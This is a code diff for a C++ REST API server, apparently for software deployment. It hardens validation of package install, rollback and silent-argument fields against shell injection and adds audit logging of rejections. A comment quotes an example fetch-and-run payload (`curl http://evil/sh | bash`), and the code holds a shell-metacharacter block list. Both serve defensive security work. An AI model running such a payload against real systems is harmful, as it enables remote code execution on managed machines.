@@ -490,38 +490,60 @@ const std::string& openapi_spec() {
     return spec;
 }
 
-// ── Install-command input validation (#771 / W7.5) ──────────────────────────
+// ── Install-command input validation (#771 / W7.5 PR 1) ──────────────────────
 //
-// `verify_command` and `rollback_command` on a SoftwarePackage are persisted
-// in `software_packages.{verify,rollback}_command` and (per the cluster-2
-// follow-up roadmap) will be dispatched to enrolled agents once the
-// deployment-execution path is wired up. To prevent a Write-permission
-// operator from staging a fleet-RCE payload via shell injection (e.g.
-// `"curl http://evil/sh | bash"`), reject any command that contains
-// shell-meta characters at REST input time.
+// `verify_command`, `rollback_command`, and `silent_args` on a SoftwarePackage
+// are persisted in `software_packages.*` and (per the cluster-2 follow-up
+// roadmap) will be dispatched to enrolled agents once the deployment-execution
+// path is wired up. To prevent a Write-permission operator from staging a
+// fleet-RCE payload via shell injection (e.g. `"curl http://evil/sh | bash"`),
+// reject any string that contains shell-meta characters at REST input time.
 //
-// Allowed characters cover the realistic verify-command vocabulary across
-// Windows / Linux / macOS installers (msiexec, reg, wmic, dpkg, rpm, pkg,
-// PowerShell single-line invocations). The block-list targets command
-// chaining (`;` `&` `|`), substitution (`` ` `` `$`), redirection (`<` `>`),
-// subshells (`(` `)`), and multi-line / control characters. Brace/bracket
-// glob expansion is NOT blocked because msiexec product GUIDs need them
-// (`msiexec /x {GUID} /qn`), and brace expansion is shell-side only —
-// agents executing via `safe_execute` (CreateProcessW / fork+execvp) do
-// not interpret these. The length cap is 512 chars — generous for any
-// realistic installer invocation.
+// Allowed characters cover the realistic install vocabulary across Windows /
+// Linux / macOS installers (msiexec, reg, wmic, dpkg, rpm, pkg, PowerShell
+// single-line invocations, /qn /norestart-style silent args). The block-list
+// targets:
+//   - command chaining: ; & |
+//   - substitution: ` $
+//   - redirection: < >
+//   - subshells: ( )
+//   - all C0 control characters except SPACE (covers \n \r \0 \t VT FF etc.)
+//   - DEL (0x7F)
 //
-// This is **defence-in-depth**: it caps the harm if/when an operator
-// (or a future code path) ends up dispatching the field through a shell.
-// The architectural follow-up (PR 2 of the W7.5 ladder) replaces the
-// free-form string with a structured-action protocol that bypasses the
-// shell entirely.
+// Why not block braces / brackets / globs? Brace expansion is shell-side only
+// — agents executing via `safe_execute` (CreateProcessW / fork+execvp) do not
+// interpret braces. msiexec product GUIDs need them (`msiexec /x {GUID} /qn`).
+// Length cap is 512 chars — generous for any realistic installer invocation.
+//
+// UTF-8 invariance: all blocked characters are ASCII. UTF-8 continuation
+// bytes are 0x80–0xBF, never collide with our ASCII block-list, so a
+// byte-wise scan on a UTF-8 std::string_view is correct without codepoint
+// decoding. Do NOT "fix" the byte scan by adding decoding — it would not be
+// safer and would slow the hot path.
+//
+// This is **defence-in-depth**: it caps the harm if/when an operator (or a
+// future code path) ends up dispatching the field through a shell. The
+// architectural follow-up (PR 2 of the W7.5 ladder) replaces the free-form
+// string with a structured-action protocol via InstructionDefinition
+// reference, which bypasses the shell entirely. PR 2 also needs to reconcile
+// this validator's accepted alphabet ({ } [ ] etc.) against the agent-side
+// `is_safe_arg` in content_dist_plugin.cpp, which currently has a stricter
+// block list — divergence noted by Round 1 consistency review.
 constexpr std::size_t kMaxInstallCommandLen = 512;
 
 bool is_safe_install_command(std::string_view s) {
     if (s.size() > kMaxInstallCommandLen)
         return false;
     for (char c : s) {
+        const auto uc = static_cast<unsigned char>(c);
+        // Block ALL C0 control characters except SPACE (covers \0 \t \n \r
+        // VT FF and the rest). Catches log-injection via VT (0x0B) etc. that
+        // a journald collector might normalise to \n.
+        if (uc < 0x20 && c != ' ')
+            return false;
+        // Block DEL (0x7F).
+        if (uc == 0x7F)
+            return false;
         switch (c) {
         // Command chaining / control flow
         case ';':
@@ -536,10 +558,6 @@ bool is_safe_install_command(std::string_view s) {
         // Subshell
         case '(':
         case ')':
-        // Multi-line / control characters
-        case '\n':
-        case '\r':
-        case '\0':
             return false;
         default:
             break;
@@ -2786,48 +2804,88 @@ void RestApiV1::register_routes(
                 res.set_content(error_json("invalid JSON"), "application/json");
                 return;
             }
-            auto pkg_name = body.value("name", "");
-            auto pkg_version = body.value("version", "");
-            if (pkg_name.empty() || pkg_version.empty()) {
+
+            // Helper: emit a rejection-audit row AND set Sec-Audit-Failed
+            // header if the audit_fn signals failure. Matches the W1.1 /
+            // PR #883 pattern used by the session-revoke handlers — the
+            // operator must learn from the response whether the security
+            // event was actually persisted.
+            auto emit_denial = [&](const char* detail_msg) {
+                bool emitted = audit_fn(req, "software_package.create", "denied", "SoftwarePackage",
+                                        "", detail_msg);
+                if (!emitted)
+                    res.set_header("Sec-Audit-Failed", "true");
+            };
+
+            SoftwarePackage pkg;
+            try {
+                auto pkg_name = body.value("name", "");
+                auto pkg_version = body.value("version", "");
+                if (pkg_name.empty() || pkg_version.empty()) {
+                    res.status = 400;
+                    res.set_content(error_json("name and version are required"),
+                                    "application/json");
+                    return;
+                }
+                pkg.name = pkg_name;
+                pkg.version = pkg_version;
+                pkg.platform = body.value("platform", "windows");
+                pkg.installer_type = body.value("installer_type", "msi");
+                pkg.content_hash = body.value("content_hash", "");
+                pkg.content_url = body.value("content_url", "");
+                pkg.silent_args = body.value("silent_args", "");
+                pkg.verify_command = body.value("verify_command", "");
+                pkg.rollback_command = body.value("rollback_command", "");
+                pkg.size_bytes = body.value("size_bytes", int64_t{0});
+            } catch (const nlohmann::json::exception& e) {
+                // body.value throws json::type_error when a present field is
+                // the wrong JSON type (e.g. {"verify_command": 42}). Without
+                // this catch the exception escapes the lambda → httplib
+                // returns 500 with no audit trail. Audit + 400 instead.
+                emit_denial("payload field has wrong JSON type — string expected");
                 res.status = 400;
-                res.set_content(error_json("name and version are required"), "application/json");
+                res.set_content(error_json(std::string{"invalid field type: "} + e.what()),
+                                "application/json");
                 return;
             }
-            SoftwarePackage pkg;
-            pkg.name = pkg_name;
-            pkg.version = pkg_version;
-            pkg.platform = body.value("platform", "windows");
-            pkg.installer_type = body.value("installer_type", "msi");
-            pkg.content_hash = body.value("content_hash", "");
-            pkg.content_url = body.value("content_url", "");
-            pkg.silent_args = body.value("silent_args", "");
-            pkg.verify_command = body.value("verify_command", "");
-            pkg.rollback_command = body.value("rollback_command", "");
-            pkg.size_bytes = body.value("size_bytes", int64_t{0});
             pkg.created_by = session->username;
 
             // #771 / W7.5: reject install commands containing shell metachars
-            // BEFORE they reach the store. Audit the rejection as a security
-            // event so an operator scoping the fleet-RCE surface sees the
-            // attempted injection in the audit log even though the package
-            // was never persisted.
+            // BEFORE they reach the store. All three free-form fields
+            // (verify_command, rollback_command, silent_args) share the same
+            // dispatch threat model — silent_args is concatenated into the
+            // installer argv, verify+rollback are full command lines. Audit
+            // the rejection as a security event so an operator scoping the
+            // fleet-RCE surface sees the attempted injection in the audit log
+            // even though the package was never persisted.
+            constexpr const char* kInputErr =
+                " contains forbidden characters (shell metacharacters ; & | ` $ < > ( ) "
+                "or control characters blocked) or exceeds 512-char length cap";
             if (!is_safe_install_command(pkg.verify_command)) {
-                audit_fn(req, "software_package.create", "rejected", "SoftwarePackage", "",
-                         "verify_command contains shell metacharacters or exceeds length cap");
+                emit_denial("verify_command contains shell metacharacters / control chars or "
+                            "exceeds length cap");
                 res.status = 400;
-                res.set_content(error_json("verify_command contains forbidden characters "
-                                           "(shell metacharacters ; & | ` $ < > ( ) blocked) "
-                                           "or exceeds 512-char length cap"),
+                res.set_content(error_json(std::string{"verify_command"} + kInputErr),
                                 "application/json");
                 return;
             }
             if (!is_safe_install_command(pkg.rollback_command)) {
-                audit_fn(req, "software_package.create", "rejected", "SoftwarePackage", "",
-                         "rollback_command contains shell metacharacters or exceeds length cap");
+                emit_denial("rollback_command contains shell metacharacters / control chars or "
+                            "exceeds length cap");
                 res.status = 400;
-                res.set_content(error_json("rollback_command contains forbidden characters "
-                                           "(shell metacharacters ; & | ` $ < > ( ) blocked) "
-                                           "or exceeds 512-char length cap"),
+                res.set_content(error_json(std::string{"rollback_command"} + kInputErr),
+                                "application/json");
+                return;
+            }
+            if (!is_safe_install_command(pkg.silent_args)) {
+                // silent_args is the same attack vector as verify/rollback —
+                // it's concatenated into the installer argv on dispatch. The
+                // round-1 consistency review flagged this as the exact
+                // #1072 → #1073 sibling-gap pattern. Block here too.
+                emit_denial("silent_args contains shell metacharacters / control chars or "
+                            "exceeds length cap");
+                res.status = 400;
+                res.set_content(error_json(std::string{"silent_args"} + kInputErr),
                                 "application/json");
                 return;
             }
